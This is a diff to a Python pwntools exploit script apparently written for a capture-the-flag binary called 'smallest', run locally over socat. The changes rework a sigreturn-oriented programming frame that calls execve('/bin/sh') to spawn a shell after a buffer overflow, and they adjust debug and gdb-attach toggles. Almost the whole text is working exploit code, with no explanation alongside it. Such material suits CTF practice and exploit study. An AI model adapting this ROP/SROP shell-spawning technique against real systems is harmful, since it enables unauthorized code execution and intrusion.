@@ -5,7 +5,7 @@ local = 1
 attach = local & 0
 bps = attach & 0
 wait = 0
-debug = attach & 0 
+debug = attach & 1 
 proc_name = 'smallest'
 #socat TCP4-LISTEN:10001,fork EXEC:./ascii
 ip = '127.0.0.1' 
@@ -17,7 +17,7 @@ if debug:
 
 def wait():
 	'''wait while debug and sleep while exploiting'''
-	if wait == 1:
+	if wait == 1 :
 		raw_input('continue send?')
 	else:
 		sleep(1)
@@ -56,17 +56,18 @@ def way1():
 syscallret_addr = 0x4000BE # syscall ; ret
 start_addr = 0x4000B0
 point_start_addr = 0x400128
+rsp2 = 0x400140
 
 def way2():
-	attach()
+	# attach()
 	# 1. use srop to execve('/bin/sh',0,0)
  	frame_execve = SigreturnFrame(kernel='amd64')
 	frame_execve.rax = constants.linux.amd64.SYS_execve# 10
-	frame_execve.rdi = point_start_addr + 0x18 + 0x98 # rcx 
+	frame_execve.rdi = rsp2 + 0x98 # rcx 
 	frame_execve.rsi = 0
 	frame_execve.rdx = 0
 	frame_execve.rcx = 0x68732f6e69622f #/bin/sh
-	frame_execve.rsp = point_start_addr + 0x18
+	frame_execve.rsp = rsp2
 	frame_execve.rip = syscallret_addr
 	payload3 = p64(start_addr) + 'D'*8 + str(frame_execve)
 	sd(payload3)
@@ -80,19 +81,18 @@ def way2():
 
 
 def attach():
-	if attach == 1:
+	if attach == 1 :
 		if bps:
 			gdb.attach(pidof(proc_name)[0], open('bps'))
 		else:
 			gdb.attach(pidof(proc_name)[0])
-
-
 
 def pwn():
 	'''rop + srop + shellcode'''
 	makeio()
 	if debug:
 		context(os='linux', arch='amd64', log_level='debug')
+	attach()
 	# ===
 	# 1. use rop in bof and return to 0x4000B0
 	# 2. use 'A'*8 to padding for sigreturn addr to be setted next time
